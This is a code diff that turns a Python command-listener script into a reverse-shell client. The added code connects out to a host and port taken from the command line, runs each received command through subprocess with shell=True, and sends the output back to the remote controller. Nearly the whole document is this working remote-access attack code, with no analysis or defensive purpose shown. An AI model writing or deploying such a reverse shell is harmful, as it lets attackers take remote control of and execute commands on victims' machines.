@@ -1,34 +1,21 @@
-# coding:utf-8
-import socket, sys
+#coding:utf-8
+import socket, sys, subprocess as sp
 
-host = sys.argv[1]
-port = str(sys.argv[2])
+host = str(sys.argv[1])
+port = int(sys.argv[2])
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-s.bind(host, port))
-s.listen(10)
-conn, addr = s.accept()
-
-print("[+] Connection from {}".format(str(addr[0])))
-
+conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+conn.connect((host, port))
 while True:
-	command = raw_input("#> ")
+	command = str(conn.recv(1024))
+
 	if command != "exit()":
-		if command == "":continue
-		conn.send(command)
-		result = conn.recv(1024)
-		total_size = long(result[:16])
-		result = result[16:]
+		sh = sp.Popen(command, shell = True, stdout = sp.PIPE, stderr = sp.PIPE, stdin = sp.PIPE)
+		out , err = sh.communicate()
 
-		while total_size > len(result):
-			data = conn.recv(1024)
-			result += data
+		result = str(out) + str(err)
+		length = str(len(result)).zfill(16)
+		conn.send(length + result)
+	else: break
 
-		print(result.rstrip("\n"))
-	else:
-		conn.send("exit()")
-		print("[+] Connection Dropped!")
-		break
-
-s.close()
+conn.close()
